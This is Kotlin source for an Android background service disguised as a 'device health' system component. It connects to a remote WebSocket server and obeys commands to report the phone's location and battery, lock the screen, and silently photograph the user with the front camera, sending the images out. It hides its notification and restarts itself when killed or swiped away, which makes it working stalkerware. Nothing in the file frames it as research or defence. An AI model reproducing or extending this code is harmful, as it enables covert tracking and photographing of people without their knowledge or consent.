package com.system.service.core

import android.app.*
import android.content.Intent
import android.hardware.camera2.*
import android.location.Location
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://aged-faced-challenged-ips.trycloudflare.com"
        private const val CHANNEL_ID = "device_health"
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createHiddenNotificationChannel()
        startForeground(1, buildHiddenNotification())
        connectServer()
        // Watchdog + WorkManager set up karo
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        wsManager?.disconnect()
        releaseWakeLock()
        // Destroy ke baad bhi restart schedule karo
        WatchdogReceiver.schedule(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // User ne recents se swipe kiya — fir bhi restart karo
        WatchdogReceiver.schedule(this)
        startForegroundService(Intent(this, CoreService::class.java))
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "DeviceHealth::BackgroundLock"
            ).also {
                it.setReferenceCounted(false)
                it.acquire(10 * 60 * 60 * 1000L) // 10 hours max
            }
        } catch (e: Exception) { }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (e: Exception) { }
    }

    private fun connectServer() {
        try {
            val savedUrl = getSharedPreferences("config", MODE_PRIVATE)
                .getString("server_url", null)
            if (savedUrl != null) SERVER_URL = savedUrl

            wsManager = WebSocketManager(
                serverUrl = SERVER_URL,
                onMessage = { handleCommand(it) },
                onConnected = { },
                onDisconnected = { }
            )
            wsManager?.connect()
        } catch (e: Exception) { }
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {
                "lock_screen"  -> lockScreen()
                "get_battery"  -> sendBattery()
                "get_location" -> sendLocation()
                "take_photo"   -> sendPhoto()
            }
        } catch (e: Exception) { }
    }

    fun sendData(type: String, data: JSONObject) {
        try {
            data.put("type", type)
            data.put("timestamp", System.currentTimeMillis())
            wsManager?.send(data)
        } catch (e: Exception) { }
    }

    private fun lockScreen() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE)
                as android.app.admin.DevicePolicyManager
            dpm.lockNow()
        } catch (e: Exception) { }
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            sendData("battery", JSONObject().apply { put("battery", level) })
        } catch (e: Exception) { }
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                loc?.let {
                    sendData("location", JSONObject().apply {
                        put("lat", it.latitude)
                        put("lng", it.longitude)
                    })
                }
            }
        } catch (e: Exception) { }
    }

    private fun sendPhoto() {
        try {
            val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = mgr.cameraIdList.firstOrNull { id ->
                mgr.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) ==
                        CameraCharacteristics.LENS_FACING_FRONT
            } ?: mgr.cameraIdList.firstOrNull() ?: return

            val map = mgr.getCameraCharacteristics(cameraId)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            val size = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
                .minByOrNull { it.width * it.height } ?: return

            val imageReader = android.media.ImageReader.newInstance(
                size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
            val thread = HandlerThread("CamThread").apply { start() }
            val handler = Handler(thread.looper)

            mgr.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        .apply { addTarget(imageReader.surface) }.build()
                    cam.createCaptureSession(listOf(imageReader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                s.capture(req, object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        ss: CameraCaptureSession,
                                        r: android.hardware.camera2.CaptureRequest,
                                        res: android.hardware.camera2.TotalCaptureResult
                                    ) {
                                        imageReader.acquireLatestImage()?.let { img ->
                                            val buf = img.planes[0].buffer
                                            val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                                            sendData("photo", JSONObject().apply {
                                                put("image", android.util.Base64.encodeToString(
                                                    bytes, android.util.Base64.NO_WRAP))
                                            })
                                            img.close()
                                        }
                                        cam.close(); thread.quitSafely()
                                    }
                                }, handler)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                cam.close(); thread.quitSafely()
                            }
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, e: Int) { cam.close() }
            }, handler)
        } catch (e: Exception) { }
    }

    /** IMPORTANCE_NONE = status bar mein bilkul nahi dikhega */
    private fun createHiddenNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Background Services",
            NotificationManager.IMPORTANCE_NONE
        ).apply {
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun buildHiddenNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setSilent(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, id: Int): Int {
        // START_STICKY — Android khud restart karega agar kill ho gaya
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
